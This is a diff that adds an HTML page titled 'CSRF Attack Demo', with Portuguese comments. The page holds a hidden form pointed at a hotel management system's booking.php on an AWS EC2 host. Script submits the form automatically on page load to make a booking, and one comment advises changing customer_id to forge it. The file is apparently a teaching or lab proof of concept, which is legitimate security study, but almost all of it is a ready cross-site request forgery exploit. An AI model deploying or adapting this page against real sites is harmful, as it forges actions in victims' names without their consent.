@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8">
+    <title>CSRF Attack Demo</title>
+  </head>
+  <body>
+    <h1>Executando CSRF - Hotel Booking</h1>
+
+    <!-- Formulário oculto que será enviado automaticamente -->
+    <form id="csrfForm" action="http://ec2-44-201-230-80.compute-1.amazonaws.com/hotel-mgmt-system/booking.php" method="POST">
+      <input type="hidden" name="room_id" value="1"> <!-- Id do quarto a ser reservado -->
+      <input type="hidden" name="check_in" value="2024-11-01">
+      <input type="hidden" name="check_out" value="2024-11-05">
+      <input type="hidden" name="customer_id" value="123"> <!-- Manipule o customer_id para falsificar a reserva -->
+      <input type="hidden" name="submit" value="Reserve">
+    </form>
+
+    <script>
+      // Enviar o formulário automaticamente ao carregar a página
+      window.onload = function() {
+        document.getElementById('csrfForm').submit();
+      };
+    </script>
+  </body>
+</html>
